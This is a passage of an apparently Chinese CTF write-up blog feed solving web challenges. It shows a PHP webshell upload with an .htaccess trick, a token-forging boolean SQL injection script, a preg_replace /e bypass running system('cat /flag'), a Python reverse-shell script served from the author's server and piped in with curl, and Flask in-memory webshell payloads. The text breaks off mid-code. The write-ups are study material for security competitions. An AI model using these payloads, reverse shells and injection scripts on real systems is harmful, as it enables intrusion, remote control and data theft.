class="comment">// 检查 cookie 中是否有 token</span></span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>] ?? <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$token</span>);</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$token</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$token</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$token</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$isLocal</span> = <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$isLocal</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$isLocal</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome Back，&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;!&#x27;</span>;</span><br><span class="line">        <span class="comment">//如果 upload 目录下存在$username.png文件，则显示图片</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;upload/&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$token</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">            <span class="comment">// 显示图片，缩小图片</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;upload/&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$token</span>[<span class="string">&#x27;filename&#x27;</span>] .<span class="string">&#x27;&quot; width=&quot;200&quot;&gt;&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;请上传您高贵的头像。&#x27;</span>;</span><br><span class="line">            <span class="comment">// 写一个上传头像的功能</span></span><br><span class="line">            <span class="variable">$html</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">            &lt;form method=&quot;post&quot; action=&quot;upload.php&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            EOD</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// echo &quot;留个言吧&quot;;</span></span><br><span class="line">        <span class="variable">$html</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">        &lt;h1&gt;留言板&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;label for=&quot;input-text&quot;&gt;Enter some text:&lt;/label&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; id=&quot;input-text&quot; placeholder=&quot;Type here...&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;button onclick=&quot;displayInput()&quot;&gt;Display&lt;/button&gt;</span></span><br><span class="line"><span class="string">        EOD</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$html</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Login&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;Login&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=&quot;post&quot; action=&quot;./login.php&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; required&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; required&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOD</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">displayInput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> inputText = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&quot;input-text&quot;</span>).value;</span><br><span class="line">      document.<span class="title function_ invoke__">write</span>(inputText)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>里面有一个上传文件的功能点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;upload.php&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Upload&quot;</span>&gt;</span><br><span class="line">            &lt;/form&gt;</span><br></pre></td></tr></table></figure><p>要进入这个功能点需要满足 <code>$isLocal</code>为真</p><p>注意到这个<code>extract($_GET);</code></p><p>可以通过get传参直接去覆盖$_SERVER[‘REMOTE_ADDR’]</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$isLocal</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但是其实这里也完全没必要, 直接给把那段上传的html代码粘贴到网站里给upload.php上传文件就行, 这里我们正常做</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526194419508.png" alt="image-20240526194419508" /><p>这里上传一个php木马, 直接去upload目录下访问是不会解析的, 原因未知, 一开始猜测是用了file_get_contents, 但是当我尝试传了一个.htaccess再访问时发现403了</p><p>那么构造.htaccess把png解析成php</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526194928431.png" alt="image-20240526194928431" /><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526195805665.png" alt="image-20240526195805665" /><p>之后yijian连接即可</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526195921876.png" alt="image-20240526195921876" /><h2 id="EzLogin"><a href="#EzLogin" class="headerlink" title="EzLogin"></a>EzLogin</h2><p>进去看网站源码有一个提示&#x2F;register.html 可以注册用户</p><p>先随便注册一个账号 abc&#x2F;123, 去登录得到一个cookie, 并且提示我们不是admin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">65794a3163325679626d46745a534936496d46695979497349434a306232746c62694936496a6b774d4445314d446b344d324e6b4d6a526d596a426b4e6a6b324d3259335a4449345a5445335a6a637949697767496d6c7a5832466b62576c75496a6f7766513d3d</span><br></pre></td></tr></table></figure><p>一眼hex, 后面还有一层base64</p><p>解码后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;abc&quot;, &quot;token&quot;:&quot;900150983cd24fb0d6963f7d28e17f72&quot;, &quot;is_admin&quot;:0&#125;</span><br></pre></td></tr></table></figure><p>修改这个is_admin为1再访问, 这次会回显我们的密码, 当我们为伪造token中的username为admin会被检测到</p><p>再看这个token,很像md5</p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240526201250853.png" alt="image-20240526201250853" /><p>这个就是账号的md5</p><p>这里比较坑就在于你的username必须足够简单不然发现不了这个</p><p>那么就可以更改username和md5来伪造token了</p><p>手搓很麻烦 , 写个脚本测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">EncodeToken</span>(<span class="params">original_string</span>):</span><br><span class="line">    base64_encoded = base64.b64encode(original_string.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    hex_string = base64_encoded.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> hex_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DecodeToken</span>(<span class="params">hex_str</span>):</span><br><span class="line">    b64_str = <span class="built_in">bytes</span>.fromhex(hex_str)</span><br><span class="line">    token_str = base64.b64decode(b64_str)</span><br><span class="line">    <span class="keyword">return</span> token_str.decode()</span><br></pre></td></tr></table></figure><p>大概这样两个函数即可</p><p>之后会发现username其实有一个sql注入 布尔注入</p><p>过滤了空格 <code>&gt;</code> <code>&lt;</code> <code>between and</code>  </p><p>很难二分, 好在服务器比较快, 直接爆了</p><p>贴一下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_hash</span>(<span class="params">input_string</span>):</span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(input_string.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://challenge.qsnctf.com:30230/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">EncodeToken</span>(<span class="params">original_string</span>):</span><br><span class="line">    base64_encoded = base64.b64encode(original_string.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    hex_string = base64_encoded.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> hex_string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DecodeToken</span>(<span class="params">hex_str</span>):</span><br><span class="line">    b64_str = <span class="built_in">bytes</span>.fromhex(hex_str)</span><br><span class="line">    token_str = base64.b64decode(b64_str)</span><br><span class="line">    <span class="keyword">return</span> token_str.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Register</span>(<span class="params">username, password</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url+<span class="string">&#x27;register.php&#x27;</span>, data=data)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Login</span>(<span class="params">username, password</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url+<span class="string">&#x27;login.php&#x27;</span>, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># res = Register(username=username, password=password)</span></span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line"><span class="comment"># token = Login(username, password)[6:]</span></span><br><span class="line"><span class="comment"># token = DecodeToken(token)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># token_json = json.loads(token)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SendReq</span>(<span class="params">username</span>):</span><br><span class="line"></span><br><span class="line">    token_json = &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    token_json[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">    user_hash = md5_hash(username)</span><br><span class="line">    token_json[<span class="string">&#x27;token&#x27;</span>] = user_hash</span><br><span class="line">    token_json[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    token_str = json.dumps(token_json)</span><br><span class="line">    TOKEN = EncodeToken(token_str)</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;TOKEN=&#x27;</span> + TOKEN</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.get(url=url+<span class="string">&#x27;home.php&#x27;</span>, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sql = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># # dkctf  </span></span><br><span class="line"><span class="comment"># sql = &#x27;version()&#x27;</span></span><br><span class="line"><span class="comment"># # 10.5.23-MariaDB-0+deb11u1</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&quot;select (table_name) from information_schema.tables where table_schema=database() limit 1,1&quot;</span></span><br><span class="line"><span class="comment"># user  secret</span></span><br><span class="line">sql = <span class="string">&quot;select (column_name) from information_schema.columns where table_name=&#x27;secret&#x27; limit 1,1&quot;</span></span><br><span class="line"><span class="comment"># flag sseeccrreett</span></span><br><span class="line">sql = <span class="string">&quot;select (sseeccrreett) from secret&quot;</span></span><br><span class="line"><span class="comment">#  # DRKCTF&#123;8b31c3a2f57b4de68124ac7734734944&#125;</span></span><br><span class="line"></span><br><span class="line">sql = sql.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">username =<span class="string">&quot;&#x27;or/**/ascii(substr(database(),1,1))=1#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    asc = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span>(asc &lt; <span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">&quot;&#x27;or/**/ascii(substr((&quot;</span> + sql + <span class="string">&quot;),&#123;&#125;,1))=&#123;&#125;#&quot;</span></span><br><span class="line">       <span class="comment"># print(payload.format(k, asc))</span></span><br><span class="line">        res = SendReq(payload.<span class="built_in">format</span>(k, asc))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hacker!!&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Hacker!!&#x27;</span>)</span><br><span class="line">            exit</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;No user found&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            asc = asc + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;@q^4*!z8a9-%42z.s~&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag = flag + <span class="built_in">chr</span>(asc)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line">            exit</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text[-<span class="number">200</span>:])</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h1&gt;&lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://example.com/categories/WriteUp/"/>
    
    
  </entry>
  
  <entry>
    <title>H&amp;NCTF 2024 Web</title>
    <link href="http://example.com/2024/05/30/H-NCTF-2024-Web/"/>
    <id>http://example.com/2024/05/30/H-NCTF-2024-Web/</id>
    <published>2024-05-30T03:36:58.000Z</published>
    <updated>2024-05-30T05:41:48.716Z</updated>
    
    <content type="html"><![CDATA[<h1 id="H-NCTF-2024-WEB-复现"><a href="#H-NCTF-2024-WEB-复现" class="headerlink" title="H&amp;NCTF 2024 WEB 复现"></a>H&amp;NCTF 2024 WEB 复现</h1><p>赛中只解出两题, 其他的wp都还能看懂差不多, 这里复现一下</p><h2 id="Please-RCE-Me"><a href="#Please-RCE-Me" class="headerlink" title="Please_RCE_Me"></a>Please_RCE_Me</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;moran&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line">        <span class="variable">$str2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="variable">$str1</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$str2</span>) != <span class="number">19</span> || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="variable">$str2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>preg_match(&#39;/please_give_me_flag/&#39;,$str2)</code>这里不忽略大小写, 后面忽略大小写, 故绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://hnctf.imxbt.cn:46810/?moran=flag&amp;e=assert&amp;pass=system(&#x27;cat /flag&#x27;);</span><br><span class="line"></span><br><span class="line">flag=please_give_me_flaG&amp;task=register_shutdown_function($_REQUEST[&#x27;e&#x27;],$_REQUEST[&#x27;pass&#x27;])</span><br></pre></td></tr></table></figure><h2 id="ezFlask"><a href="#ezFlask" class="headerlink" title="ezFlask"></a>ezFlask</h2><p>比较抽象的一题, 这里非预期解出来了, </p><p>一开始想到的就是dns外带并且也可以成功, 但是这个容器太抽象了, 执行一次就得重开</p><p>下面说说我的方法,</p><p>首先我们知道这里禁用了很多命令</p><p>由于容器比较奇葩, fuzz的成本太高了, 这里只fuzz出来curl命令是可以执行的, 并且<code>$ </code> <code>|</code>这两个符号也是可以用的,所以我们的思路就是把远端的恶意shell命令curl下来通过管道放进<code>$0</code>,也就是放进当前执行的脚本(bash), 达到反弹shell的目的</p><p>首先vps起一个服务, 用来返回python反弹shell脚本 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;107.148.75.202&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>之后nc监听 7777端口</p><p>发送执行curl命令的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;os&quot;).popen(&quot;curl www.n4c1.top:5000/ |$0&quot;).read()</span><br></pre></td></tr></table></figure><p>这样我们就可以的到shell, 然后就是读源码拿flag</p><p>看正解是python内存马, 之前好像接触过一次, 没什么印象, 学习了</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">https://www.cnblogs.com/gxngxngxn/p/18181936</a></p><p>大概就是通过eval的任意代码执行, 为flask当前app添加一条路由, 并将其与恶意操作函数绑定, 与Java的tomcat内存马相似, 此操作无文件落地, 通过修改中间件来获取shell</p><p>网上可以搜到很多payload</p><p>这里列出两条师傅们wp里的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(&#x27;/shell&#x27;,&#x27;shell&#x27;,lambda:__import__(&#x27;os&#x27;).popen(&quot;cat</span><br><span class="line">/flag&quot;).read())</span><br><span class="line"></span><br><span class="line">x cmd=render_template_string(&quot;&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;myshell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;)).read())\&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;&quot;)</span><br></pre></td></tr></table></figure><p>之后访问我们添加的shell路由即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/shell</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">/shell?cmd=cat%20/flag</span><br></pre></td></tr></table></figure><h2 id="GoJava"><a href="#GoJava" class="headerlink" title="GoJava"></a>GoJava</h2><p>robots.txt中泄露了网站源码的备份</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 